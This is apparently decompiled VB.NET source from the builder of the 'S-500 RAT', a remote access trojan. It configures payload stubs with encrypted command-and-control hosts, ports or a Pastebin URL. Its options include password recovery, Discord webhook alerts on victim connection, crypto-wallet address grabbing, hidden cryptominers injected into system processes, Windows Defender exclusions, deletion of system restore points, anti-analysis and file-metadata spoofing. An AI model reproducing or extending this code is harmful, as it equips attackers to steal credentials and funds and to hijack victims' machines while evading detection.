		Private Sub CloneAssembly_Click(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Filter = "File (*.exe)|*.exe"
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						Dim versionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName)
						Me.TitleAssembly.Text = (If(versionInfo.InternalName, String.Empty))
						Me.DescriptionsAssembly.Text = (If(versionInfo.FileDescription, String.Empty))
						Me.CompanyAssembly.Text = (If(versionInfo.CompanyName, String.Empty))
						Me.TrademarksAssembly.Text = (If(versionInfo.ProductName, String.Empty))
						Me.CopyrightAssembly.Text = (If(versionInfo.LegalCopyright, String.Empty))
						Me.TrademarksAssembly.Text = (If(versionInfo.LegalTrademarks, String.Empty))
						Dim fileMajorPart As Integer = versionInfo.FileMajorPart
						Me.Versions1.Value = New Decimal(versionInfo.FileMajorPart)
						Me.Versions2.Value = New Decimal(versionInfo.FileMinorPart)
						Me.Versions3.Value = New Decimal(versionInfo.FileBuildPart)
						Me.Versions4.Value = New Decimal(versionInfo.FilePrivatePart)
					End If
				End Using
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D56 RID: 3414 RVA: 0x000729AC File Offset: 0x00070BAC
		Private Sub EnabledAssembly_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.EnabledAssembly.Checked
				If checked Then
					Me.TitleAssembly.Enabled = True
					Me.DescriptionsAssembly.Enabled = True
					Me.CompanyAssembly.Enabled = True
					Me.TrademarksAssembly.Enabled = True
					Me.CopyrightAssembly.Enabled = True
					Me.Versions1.Enabled = True
					Me.Versions2.Enabled = True
					Me.Versions3.Enabled = True
					Me.Versions4.Enabled = True
					Me.CloneAssembly.Enabled = True
				Else
					Me.TitleAssembly.Enabled = False
					Me.DescriptionsAssembly.Enabled = False
					Me.CompanyAssembly.Enabled = False
					Me.TrademarksAssembly.Enabled = False
					Me.CopyrightAssembly.Enabled = False
					Me.Versions1.Enabled = False
					Me.Versions2.Enabled = False
					Me.Versions3.Enabled = False
					Me.Versions4.Enabled = False
					Me.CloneAssembly.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D57 RID: 3415 RVA: 0x00072B08 File Offset: 0x00070D08
		Private Sub Enabled_Icon_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.Enabled_Icon.Checked
				If checked Then
					Me.Chose_Icon.Enabled = True
					Me.PictureBox_Icons.Enabled = True
				Else
					Me.Chose_Icon.Enabled = False
					Me.PictureBox_Icons.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D58 RID: 3416 RVA: 0x00072B84 File Offset: 0x00070D84
		Private Sub Chose_Icon_Click(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Title = "Choose Icon"
					openFileDialog.Filter = "Icon |*.ico"
					openFileDialog.Multiselect = False
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						Me.Icon_Filename.Text = openFileDialog.FileName
						Me.PictureBox_Icons.Image = Image.FromFile(Me.Icon_Filename.Text)
					Else
						Me.Icon_Filename.Text = ""
						Me.PictureBox_Icons.Image = Nothing
					End If
				End Using
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D59 RID: 3417 RVA: 0x00072C54 File Offset: 0x00070E54
		Private Sub Spoofing_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.Spoofing.Checked
				If checked Then
					Me.SpoofingText.Enabled = True
				Else
					Me.SpoofingText.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D5A RID: 3418 RVA: 0x00072CB4 File Offset: 0x00070EB4
		Private Sub EnabledSize_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.EnabledSize.Checked
				If checked Then
					Me.KB.Enabled = True
					Me.MB.Enabled = True
					Me.GB.Enabled = True
					Me.SizeValue.Enabled = True
				Else
					Me.KB.Enabled = False
					Me.MB.Enabled = False
					Me.GB.Enabled = False
					Me.SizeValue.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D5B RID: 3419 RVA: 0x00072D64 File Offset: 0x00070F64
		Private Sub Add_Socket_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.Bhost.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please enter your DNS or IP", "Sorry!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Dim flag2 As Boolean = Operators.CompareString(Me.Bport.Text, Nothing, False) = 0
					If flag2 Then
						MessageBox.Show("Please enter your Port", "Sorry!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Me.ListHostPort.Rows.Add(New Object() { Me.Bhost.Text, Me.Bport.Text })
						Me.Bhost.Clear()
						Me.Bport.Clear()
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D5C RID: 3420 RVA: 0x00072E44 File Offset: 0x00071044
		Private Sub RemaveListHostsPorts_Click(sender As Object, e As EventArgs)
			Try
				Try
					For Each obj As Object In Me.ListHostPort.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Me.ListHostPort.Rows.Remove(dataGridViewRow)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D5D RID: 3421 RVA: 0x00072ED4 File Offset: 0x000710D4
		Private Sub BIPDNS_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.BIPDNS.Checked
				If checked Then
					Me.Bhost.Enabled = True
					Me.Bport.Enabled = True
					Me.ListHostPort.Enabled = True
					Me.Add_Socket.Enabled = True
					Me.RemaveListHostsPorts.Enabled = True
				Else
					Me.Bhost.Enabled = False
					Me.Bport.Enabled = False
					Me.ListHostPort.Enabled = False
					Me.Add_Socket.Enabled = False
					Me.RemaveListHostsPorts.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D5E RID: 3422 RVA: 0x00072F9C File Offset: 0x0007119C
		Private Sub Bpastebin_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.Bpastebin.Checked
				If checked Then
					Me.BPastebinTxt.Enabled = True
				Else
					Me.BPastebinTxt.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D5F RID: 3423 RVA: 0x00072FFC File Offset: 0x000711FC
		Public Function InfoDLL() As String
			Dim text As String = "|'M'|"
			Dim text2 As String = ""
			Dim text3 As String = Me.BClientName.Text.ToString()
			Try
				text2 = text3
				Dim checked As Boolean = Me.EnableGrabber.Checked
				If checked Then
					text2 = text2 + text + "True"
				Else
					text2 = text2 + text + "False"
				End If
				Dim checked2 As Boolean = Me.EnableMining.Checked
				If checked2 Then
					text2 = text2 + text + "True"
				Else
					text2 = text2 + text + "False"
				End If
				Dim checked3 As Boolean = Me.EnableGrabber.Checked
				If checked3 Then
					text2 = String.Concat(New String() { text2, text, Me.BTCAddress.Text, text, Me.ETHAddress.Text, text, Me.XMRAddress.Text })
				Else
					text2 = String.Concat(New String() { text2, text, "?", text, "?", text, "?" })
				End If
				Dim checked4 As Boolean = Me.EnableMining.Checked
				If checked4 Then
					text2 = Conversions.ToString(Operators.AddObject(text2, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(text, Me.MiningCoin()), text), Me.MiningWorkName.Text), text), Me.MiningPool.Text), text), Me.MiningNumMax.Text.Split(New Char() { "%"c })(0)), text + Me.MiningWalletAddress.Text), text), Me.MiningInject(False))))
				End If
			Catch ex As Exception
			End Try
			Return text2
		End Function

		' Token: 0x06000D60 RID: 3424 RVA: 0x000731F8 File Offset: 0x000713F8
		Public Function MiningAndProtectDLL() As String
			Dim text As String = "|'Split'|"
			Dim text2 As String = ""
			Try
				Dim checked As Boolean = Me.ProcessCritical.Checked
				If checked Then
					text2 = text2 + "True" + text
				Else
					text2 = text2 + "False" + text
				End If
				Dim checked2 As Boolean = Me.ProcessProtections.Checked
				If checked2 Then
					text2 = text2 + "True" + text
				Else
					text2 = text2 + "False" + text
				End If
				Dim checked3 As Boolean = Me.EnableMining.Checked
				If checked3 Then
					text2 = Conversions.ToString(Operators.AddObject(text2, Operators.AddObject(Operators.AddObject(Operators.AddObject("True" + text, Me.MiningInject(False)), text), Me.SetMiner())))
				Else
					text2 = text2 + "False" + text
				End If
			Catch ex As Exception
			End Try
			Return text2
		End Function

		' Token: 0x06000D61 RID: 3425 RVA: 0x000732F0 File Offset: 0x000714F0
		Public Function SetConnection(Stub As String) As Object
			Dim text As String = Stub
			Me.Key = Me.KeEncrypt.Text.ToString()
			Dim flag As Boolean = Operators.CompareString(Me.Key, String.Empty, False) = 0
			If flag Then
				Me.Key = "S500x1"
			End If
			Try
				Dim randomString As String = Functions.GetRandomString(32)
				Dim x509Certificate As X509Certificate2 = New X509Certificate2(Setting.Certificate_Path, "", X509KeyStorageFlags.Exportable)
				Dim x509Certificate2 As X509Certificate2 = New X509Certificate2(x509Certificate.Export(X509ContentType.Cert))
				Dim inArray As Byte()
				Using rsacryptoServiceProvider As RSACryptoServiceProvider = CType(x509Certificate.PrivateKey, RSACryptoServiceProvider)
					Dim rgbHash As Byte() = Sha256M.ComputeHash(Encoding.UTF8.GetBytes(randomString))
					inArray = rsacryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"))
				End Using
				text = text.Replace("%CertificateKey%", Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString)))
				text = text.Replace("%Certificate%", Functions.AES_EncryptText(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)), Me.Key))
				text = text.Replace("%ServerSignature%", Functions.AES_EncryptText(Convert.ToBase64String(inArray), Me.Key))
				text = text.Replace("*SPL", Functions.AES_EncryptText("Packet", Me.Key))
				text = text.Replace("*RegPlugin", Functions.AES_EncryptText("Software\\F9862261E1456F", Me.Key))
				text = text.Replace("*Key", Functions.StringToBase64(Me.Key))
				text = text.Replace("*ClientName", Functions.AES_EncryptText(Me.InfoDLL(), Me.Key))
				Dim checked As Boolean = Me.PasswordsEnable.Checked
				If checked Then
					text = text.Replace("//msgPack.ForcePathObject(SPL).SetAsString(RecoviryPass);", Resources.RecoveryPasswords.Replace("##RecoviryPass##", Functions.AES_EncryptText("RecoviryPass", Me.Key)))
				Else
					text = text.Replace("//msgPack.ForcePathObject(SPL).SetAsString(RecoviryPass);", "")
				End If
				text = text.Replace("//GetPlugin(Osk.Aes256Decrypt(""GetID""), null);", "GetPlugin(Osk.Aes256Decrypt(""" + Functions.AES_EncryptText("GetID", Me.Key) + """), null);")
				text = text.Replace("//string Info = (Osk.Aes256Decrypt(""InfoDLL"") + Osk.SPL + ClientName);", "string Info = (Osk.Aes256Decrypt(""" + Functions.AES_EncryptText("InfoDLL", Me.Key) + """) + Osk.SPL + ClientName);")
				text = text.Replace("##GetID##", Functions.AES_EncryptText("GetID", Me.Key))
				text = text.Replace("##InfoDLL##", Functions.AES_EncryptText("InfoDLL", Me.Key))
				text = text.Replace("##ClientName##", Functions.AES_EncryptText("ClientName", Me.Key))
				text = text.Replace("##S.S##", Functions.AES_EncryptText("S.S", Me.Key))
				text = text.Replace("##Run##", Functions.AES_EncryptText("Run", Me.Key))
				text = text.Replace("##SHA256##", Functions.AES_EncryptText("SHA256", Me.Key))
				text = text.Replace("##IDHash##", Functions.AES_EncryptText("IDHash", Me.Key))
				text = text.Replace("##Hash##", Functions.AES_EncryptText("Hash", Me.Key))
				text = text.Replace("##Dll##", Functions.AES_EncryptText("Dll", Me.Key))
				text = text.Replace("##Argse##", Functions.AES_EncryptText("Argse", Me.Key))
				text = text.Replace("##Check##", Functions.AES_EncryptText("Check", Me.Key))
				text = text.Replace("##Error##", Functions.AES_EncryptText("Error", Me.Key))
				text = text.Replace("##Value##", Functions.AES_EncryptText("Value", Me.Key))
				Dim value As Integer
				Try
					Dim flag2 As Boolean = Operators.CompareString(Me.RefreshConnect.Text, Nothing, False) = 0
					If flag2 Then
						value = 3000
					Else
						value = Conversions.ToInteger(Conversions.ToDouble(Me.RefreshConnect.Text) * 1000.0)
					End If
				Catch ex As Exception
					value = 3000
				End Try
				text = text.Replace("""%Reconnect%""", Conversions.ToString(value))
				Dim checked2 As Boolean = Me.BIPDNS.Checked
				If checked2 Then
					text = text.Replace("//public static string Pastebin = ""*URL"";", "")
					text = text.Replace("//Osk.Pastebin = Osk.Aes256Decrypt(Osk.Pastebin);", "")
					text = text.Replace("//CodeHostsPorts", Resources.CodeHostPort.ToString())
					Try
						Dim text2 As String = String.Empty
						Try
							For Each obj As Object In CType(Me.ListHostPort.Rows, IEnumerable)
								Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
								Dim flag3 As Boolean = Not dataGridViewRow.IsNewRow
								If flag3 Then
									text2 = text2 + dataGridViewRow.Cells(0).Value.ToString() + ","
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
						text = text.Replace("*Host", Functions.AES_EncryptText(text2.ToString(), Me.Key))
					Catch ex2 As Exception
						Console.WriteLine(ex2.Message)
					End Try
					Try
						Dim text3 As String = String.Empty
						Try
							For Each obj2 As Object In CType(Me.ListHostPort.Rows, IEnumerable)
								Dim dataGridViewRow2 As DataGridViewRow = CType(obj2, DataGridViewRow)
								Dim flag4 As Boolean = Not dataGridViewRow2.IsNewRow
								If flag4 Then
									text3 = text3 + dataGridViewRow2.Cells(1).Value.ToString() + ","
								End If
							Next
						Finally
							Dim enumerator2 As IEnumerator
							If TypeOf enumerator2 Is IDisposable Then
								TryCast(enumerator2, IDisposable).Dispose()
							End If
						End Try
						text = text.Replace("*Port", Functions.AES_EncryptText(text3.ToString(), Me.Key))
					Catch ex3 As Exception
						Console.WriteLine(ex3.Message)
					End Try
				Else
					text = text.Replace("*Host", "")
					text = text.Replace("*Port", "")
					text = text.Replace("Osk.Hosts = Osk.Aes256Decrypt(Osk.Hosts);", "")
					text = text.Replace("Osk.Ports = Osk.Aes256Decrypt(Osk.Ports);", "")
					text = text.Replace("//Public Static String Pastebin = ""*URL"";", "Public Static String Pastebin = ""*URL"";")
					text = text.Replace("//Osk.Pastebin = Osk.Aes256Decrypt(Osk.Pastebin);", "Osk.Pastebin = Osk.Aes256Decrypt(Osk.Pastebin);")
					text = text.Replace("//CodeHostsPorts", Resources.PastebinHostPort.ToString())
					text = text.Replace("*URL", Functions.AES_EncryptText(Me.BPastebinTxt.Text, Me.Key))
				End If
				Dim checked3 As Boolean = Me.DiscordNotif.Checked
				If checked3 Then
					text = text.Replace("//NOTIF", Resources.Discord.Replace("%|RAT|%", Functions.AES_EncryptText(Setting.Version, Me.Key)).Replace("%|content|%", Functions.AES_EncryptText("content", Me.Key)).Replace("%|avatar_url|%", Functions.AES_EncryptText("avatar_url", Me.Key)).Replace("%|USER|%", Functions.AES_EncryptText("username", Me.Key)).Replace("%Server%", Functions.AES_EncryptText(Me.DiscordText.Text, Me.Key)).Replace("%x1%", Functions.AES_EncryptText("S-500 RAT  Hi", Me.Key)).Replace("%x2%", Functions.AES_EncryptText("Successfully connected", Me.Key)).Replace("%x3%", Functions.AES_EncryptText("User ID : ", Me.Key)).Replace("%x4%", Functions.AES_EncryptText("Windows : ", Me.Key)).Replace("%x5%", Functions.AES_EncryptText("Host : ", Me.Key)).Replace("%x6%", Functions.AES_EncryptText("Port : ", Me.Key)).Replace("%x7%", Functions.AES_EncryptText("Enjoy :)", Me.Key)).Replace("%logo%", Functions.AES_EncryptText("https://e.top4top.io/p_2237ro7471.png", Me.Key)))
					text = text.Replace("///GetHWID", Resources.GetHWID)
				Else
					text = text.Replace("//NOTIF", "")
					text = text.Replace("///GetHWID", "")
				End If
				Try
					text = text.Replace("%S500_MEUTX%", Functions.AES_EncryptText(Me.MutexText.Text, Me.Key))
				Catch ex4 As Exception
				End Try
			Catch ex5 As Exception
				MessageBox.Show(Me, ex5.Message, "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				ListLogs.AddArray("Builder! Error : " + ex5.Message, 0)
			End Try
			Return text
		End Function

		' Token: 0x06000D62 RID: 3426 RVA: 0x00073C84 File Offset: 0x00071E84
		Public Sub ReadBuilderData()
			Try
				Me.BClientName.Text = Conversions.ToString(Functions.RegistryGetValue("#ClientName", Me.BClientName.Text))
				Me.BIPDNS.Checked = True
				Me.BIPDNS.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#IPDNS", Conversions.ToString(Me.BIPDNS.Checked)))
				Try
					Dim text As String = Conversions.ToString(Functions.RegistryGetValue("#ListHP", ""))
					Dim flag As Boolean = text <> Nothing
					If flag Then
						Dim array As String() = text.Split(New String() { "*" }, StringSplitOptions.None)
						For Each text2 As String In array
							Dim flag2 As Boolean = text2.Length > 0
							If flag2 Then
								Dim array3 As String() = text2.Split(New String() { "," }, StringSplitOptions.None)
								Me.ListHostPort.Rows.Add(New Object() { array3(0), array3(1) })
							End If
						Next
					End If
				Catch ex As Exception
				End Try
				Me.Bpastebin.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Pastebin", Conversions.ToString(Me.Bpastebin.Checked)))
				Me.BPastebinTxt.Text = Conversions.ToString(Functions.RegistryGetValue("#URLPastebin", Me.BPastebinTxt.Text))
				Me.KeEncrypt.Text = Conversions.ToString(Functions.RegistryGetValue("#KeYEncrypt", Me.KeEncrypt.Text))
				Me.RefreshConnect.Text = Conversions.ToString(Functions.RegistryGetValue("#RefreshConnect", Me.RefreshConnect.Text))
				Me.DiscordNotif.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#DiscordNotif", Conversions.ToString(Me.DiscordNotif.Checked)))
				Me.DiscordText.Text = Conversions.ToString(Functions.RegistryGetValue("#WebHookURL", Me.DiscordText.Text))
				Me.NameFolder.Text = Conversions.ToString(Functions.RegistryGetValue("#Folder", Me.NameFolder.Text))
				Me.PayloadName.Text = Conversions.ToString(Functions.RegistryGetValue("#Software", Me.PayloadName.Text))
				Me.Install_ProgramFiles.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ProgramFile", Conversions.ToString(Me.Install_ProgramFiles.Checked)))
				Me.Install_AppData.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#AppData", Conversions.ToString(Me.Install_AppData.Checked)))
				Me.Install_ProgramData.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ProgramData", Conversions.ToString(Me.Install_ProgramData.Checked)))
				Me.EnableStartup.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Startup", Conversions.ToString(Me.EnableStartup.Checked)))
				Me.HiddenInstall.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Hidden", Conversions.ToString(Me.HiddenInstall.Checked)))
				Me.ProtectInstallationFolder.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Protect", Conversions.ToString(Me.ProtectInstallationFolder.Checked)))
				Me.TaskShc.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#scheduled", Conversions.ToString(Me.TaskShc.Checked)))
				Me.Delay.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Delay", Conversions.ToString(Me.Delay.Checked)))
				Me.NumDelay.Text = Conversions.ToString(Functions.RegistryGetValue("#NumDelay", Me.NumDelay.Text))
				Me.UACLOOP.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#UACLOOP", Conversions.ToString(Me.UACLOOP.Checked)))
				Me.Runwithhighestprivileges.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Runwithhighestprivileges", Conversions.ToString(Me.Runwithhighestprivileges.Checked)))
				Me.Install.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Install", Conversions.ToString(Me.Install.Checked)))
				Me.WD_Exclusions.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#WD_Exclusions", Conversions.ToString(Me.WD_Exclusions.Checked)))
				Me.DeleteSystemRestore.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#DeleteSystemRestore", Conversions.ToString(Me.DeleteSystemRestore.Checked)))
				Me.AntiAnalysis.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#AntiAnalysis", Conversions.ToString(Me.AntiAnalysis.Checked)))
				Me.ProcessCritical.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ProcessCritical", Conversions.ToString(Me.ProcessCritical.Checked)))
				Me.ProcessProtections.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ProcessExplorer", Conversions.ToString(Me.ProcessProtections.Checked)))
				Me.EnableMining.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#EnableMining", Conversions.ToString(Me.EnableMining.Checked)))
				Me.InjectCmd.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#InjectCmd", Conversions.ToString(Me.InjectCmd.Checked)))
				Me.InjectConhost.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#InjectConhost", Conversions.ToString(Me.InjectConhost.Checked)))
				Me.InjectNotepad.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#InjectNotepad", Conversions.ToString(Me.InjectNotepad.Checked)))
				Me.ConBTC.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ConBTC", Conversions.ToString(Me.ConBTC.Checked)))
				Me.ConETH.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ConETH", Conversions.ToString(Me.ConETH.Checked)))
				Me.ConLSK.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ConLSK", Conversions.ToString(Me.ConLSK.Checked)))
				Me.ConDOGE.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ConDOGE", Conversions.ToString(Me.ConDOGE.Checked)))
				Me.ConXMR.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#ConXMR", Conversions.ToString(Me.ConXMR.Checked)))
				Me.MiningMAX.Value = Conversions.ToInteger(Functions.RegistryGetValue("#MiningMAX", Conversions.ToString(Me.MiningMAX.Value)))
				Try
					Dim flag3 As Boolean = Me.MiningMAX.Value < 10
					If flag3 Then
						Me.MiningNumMax.Text = Conversions.ToString(10) + "%"
						Me.MiningMAX.Value = 10
					Else
						Me.MiningNumMax.Text = Conversions.ToString(Me.MiningMAX.Value) + "%"
					End If
				Catch ex2 As Exception
				End Try
				Me.MiningWorkName.Text = Conversions.ToString(Functions.RegistryGetValue("#MiningWorkName", Me.MiningWorkName.Text))
				Me.MiningWalletAddress.Text = Conversions.ToString(Functions.RegistryGetValue("#MiningWalletAddress", Me.MiningWalletAddress.Text))
				Me.MiningPool.Text = Conversions.ToString(Functions.RegistryGetValue("#MiningPool", Me.MiningPool.Text))
				Me.EnableGrabber.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#EnableGrabber", Conversions.ToString(Me.EnableGrabber.Checked)))
				Me.BTCAddress.Text = Conversions.ToString(Functions.RegistryGetValue("#BTCAddress", Me.BTCAddress.Text))
				Me.ETHAddress.Text = Conversions.ToString(Functions.RegistryGetValue("#ETHAddress", Me.ETHAddress.Text))
				Me.XMRAddress.Text = Conversions.ToString(Functions.RegistryGetValue("#XMRAddress", Me.XMRAddress.Text))
				Me.PasswordsEnable.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#PasswordsEnable", Conversions.ToString(Me.PasswordsEnable.Checked)))
				Me.EnabledAssembly.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#EnabledAssembly", Conversions.ToString(Me.EnabledAssembly.Checked)))
				Me.TitleAssembly.Text = Conversions.ToString(Functions.RegistryGetValue("#TitleAssembly", Me.TitleAssembly.Text))
				Me.DescriptionsAssembly.Text = Conversions.ToString(Functions.RegistryGetValue("#DescriptionsAssembly", Me.DescriptionsAssembly.Text))
				Me.CompanyAssembly.Text = Conversions.ToString(Functions.RegistryGetValue("#CompanyAssembly", Me.CompanyAssembly.Text))
				Me.TrademarksAssembly.Text = Conversions.ToString(Functions.RegistryGetValue("#TrademarksAssembly", Me.TrademarksAssembly.Text))
				Me.CopyrightAssembly.Text = Conversions.ToString(Functions.RegistryGetValue("#CopyrightAssembly", Me.CopyrightAssembly.Text))
				Me.Versions1.Text = Conversions.ToString(Functions.RegistryGetValue("#Versions1", Conversions.ToString(Me.Versions1.Value)))
				Me.Versions2.Text = Conversions.ToString(Functions.RegistryGetValue("#Versions2", Conversions.ToString(Me.Versions2.Value)))
				Me.Versions3.Text = Conversions.ToString(Functions.RegistryGetValue("#Versions3", Conversions.ToString(Me.Versions3.Value)))
				Me.Versions4.Text = Conversions.ToString(Functions.RegistryGetValue("#Versions4", Conversions.ToString(Me.Versions4.Value)))
				Me.Spoofing.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Spoofing", Conversions.ToString(Me.Spoofing.Checked)))
				Me.SpoofingText.SelectedIndex = Conversions.ToInteger(Conversions.ToString(Functions.RegistryGetValue("#SpoofingText", Conversions.ToString(Me.SpoofingText.SelectedIndex))))
				Me.ObfusctionComboBox.SelectedIndex = Conversions.ToInteger(Conversions.ToString(Functions.RegistryGetValue("#ObfusctionComboBox", Conversions.ToString(Me.ObfusctionComboBox.SelectedIndex))))
				Me.Enabled_Icon.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#Enabled_Icon", Conversions.ToString(Me.Enabled_Icon.Checked)))
				Me.Icon_Filename.Text = Conversions.ToString(Functions.RegistryGetValue("#Icon_Filename", Me.Icon_Filename.Text))
				Try
					Dim flag4 As Boolean = Me.Icon_Filename.Text IsNot Nothing AndAlso File.Exists(Me.Icon_Filename.Text)
					If flag4 Then
						Me.PictureBox_Icons.Image = Image.FromFile(Me.Icon_Filename.Text)
					End If
				Catch ex3 As Exception
					Console.WriteLine(ex3.Message)
				End Try
				Me.EnabledSize.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#EnabledSize", Conversions.ToString(Me.EnabledSize.Checked)))
				Me.KB.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#KB", Conversions.ToString(Me.KB.Checked)))
				Me.MB.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#MB", Conversions.ToString(Me.MB.Checked)))
				Me.GB.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#GB", Conversions.ToString(Me.GB.Checked)))
				Me.SizeValue.Text = Conversions.ToString(Functions.RegistryGetValue("#SizeValue", Conversions.ToString(Me.SizeValue.Value)))
				Me.SaveBuilderInfo.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#SaveBuilderInfo", Conversions.ToString(Me.SaveBuilderInfo.Checked)))
			Catch ex4 As Exception
			End Try
		End Sub

		' Token: 0x06000D63 RID: 3427 RVA: 0x00074970 File Offset: 0x00072B70
		Public Sub SaveBuilderData()
			Try
				Functions.RegistrySetValue("#ClientName", Conversions.ToString(Me.BClientName.Text))
				Functions.RegistrySetValue("#IPDNS", Conversions.ToString(Conversions.ToBoolean(Me.BIPDNS.Checked)))
				Try
					Dim text As String = String.Empty
					Try
						For Each obj As Object In CType(Me.ListHostPort.Rows, IEnumerable)
							Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
							Dim flag As Boolean = Not dataGridViewRow.IsNewRow
							If flag Then
								text = String.Concat(New String() { text, dataGridViewRow.Cells(0).Value.ToString(), ",", dataGridViewRow.Cells(1).Value.ToString(), "*" })
							End If
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					Functions.RegistrySetValue("#ListHP", Conversions.ToString(text))
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
				Functions.RegistrySetValue("#Pastebin", Conversions.ToString(Conversions.ToBoolean(Me.Bpastebin.Checked)))
				Functions.RegistrySetValue("#URLPastebin", Conversions.ToString(Me.BPastebinTxt.Text))
				Functions.RegistrySetValue("#KeYEncrypt", Conversions.ToString(Me.KeEncrypt.Text))
				Functions.RegistrySetValue("#RefreshConnect", Conversions.ToString(Me.RefreshConnect.Text))
				Functions.RegistrySetValue("#DiscordNotif", Conversions.ToString(Conversions.ToBoolean(Me.DiscordNotif.Checked)))
				Functions.RegistrySetValue("#WebHookURL", Conversions.ToString(Me.DiscordText.Text))
				Functions.RegistrySetValue("#Install", Conversions.ToString(Conversions.ToBoolean(Me.Install.Checked)))
				Functions.RegistrySetValue("#Folder", Conversions.ToString(Me.NameFolder.Text))
				Functions.RegistrySetValue("#Software", Conversions.ToString(Me.PayloadName.Text))
				Functions.RegistrySetValue("#PrgramFiles", Conversions.ToString(Conversions.ToBoolean(Me.Install_ProgramFiles.Checked)))
				Functions.RegistrySetValue("#AppData", Conversions.ToString(Conversions.ToBoolean(Me.Install_AppData.Checked)))
				Functions.RegistrySetValue("#ProgramData", Conversions.ToString(Conversions.ToBoolean(Me.Install_ProgramData.Checked)))
				Functions.RegistrySetValue("#Startup", Conversions.ToString(Conversions.ToBoolean(Me.EnableStartup.Checked)))
				Functions.RegistrySetValue("#Hidden", Conversions.ToString(Conversions.ToBoolean(Me.HiddenInstall.Checked)))
